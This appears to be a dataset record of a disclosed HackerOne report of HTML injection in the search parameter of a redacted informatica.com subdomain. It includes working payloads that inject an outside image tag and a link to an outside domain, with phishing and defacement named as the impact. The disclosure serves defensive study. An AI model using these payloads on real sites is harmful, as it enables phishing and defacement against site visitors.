---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1081656'
original_report_id: '1081656'
title: Html injection on ██████.informatica.com via search.html?q=1
weakness: Code Injection
team_handle: informatica
created_at: '2021-01-19T16:15:01.827Z'
disclosed_at: '2021-02-12T12:51:34.616Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- code-injection
---

# Html injection on ██████.informatica.com via search.html?q=1

## Metadata

- HackerOne Report ID: 1081656
- Weakness: Code Injection
- Program: informatica
- Disclosed At: 2021-02-12T12:51:34.616Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hello dear 

I have found HTML injection  on ██████.informatica.com

parameters injectable  search.html?q=1

URL :  https://████████.informatica.com/search.html?q=1%22%3E%3Cimg%20src=https://www.no-gods-no-masters.com/images_designs/anonymous-gandhi-d001001207265.png%3E%E2%80%9D@x.y%20%22

payload ; 1"><img src=https://www.no-gods-no-masters.com/images_designs/anonymous-gandhi-d001001207265.png>”@x.y "

https://█████.informatica.com/search.html?q=1%3Ca%20href=%22//bf.am%22%3EWelcome%3C/a%3E

payload : <a href="//bf.am">Welcome</a>

## Impact

Phising

    Abusing other user

    Defacing

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
